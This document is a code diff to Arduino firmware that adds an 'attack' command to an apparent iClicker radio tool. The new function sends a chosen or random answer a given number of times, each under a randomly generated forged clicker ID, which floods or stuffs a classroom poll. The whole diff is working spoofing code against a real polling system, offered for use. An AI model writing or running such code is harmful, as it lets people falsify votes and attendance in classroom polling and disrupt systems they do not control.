@@ -87,6 +87,7 @@ void loop()
 	}
 	case OP_ATTACK:
 	{
+		attack(serialCommand[0], strtoul(&serialCommand[2], NULL, 10));
 		break;
 	}
 	case OP_REPLACE:
@@ -152,6 +153,35 @@ static inline void capture()
 	}
 	clicker.stopPromiscuous();
 	Serial.println(F("End Capture"));
+}
+
+static inline void attack(const char cAns, unsigned long count)
+{
+	/*Command Format:
+	*	A,<Answer>,<Counts>/0
+	*Start attacking Response Format:
+	*	Start Attack\n
+	*	[ACK]\n
+	*/
+	Serial.println(F("Start Attack"));
+	Serial.println(RES_SUCCESS);
+	iClickerAnswer ans;
+	uint8_t id[ICLICKER_ID_LEN];
+	for (unsigned long i = 0; i < count && !shouldStop(); i++) 
+	{
+		if ((cAns >= 'A' && cAns <= 'E') || cAns == 'P')
+			ans = clicker.charAnswer(cAns);
+		else
+			ans = clicker.randomAnswer();
+		clicker.randomId(id);
+		clicker.submitAnswer(id, ans, false);
+		Serial.print(".");
+		if (i % 10 == 0)
+			Serial.println();
+		if (cAns != 'P')
+			delay(5); //To make recieved count be accurate.
+	}
+	Serial.println(F("\nAttack Finished"));
 }
 
 static inline void changeChannel(const char* const arguments)
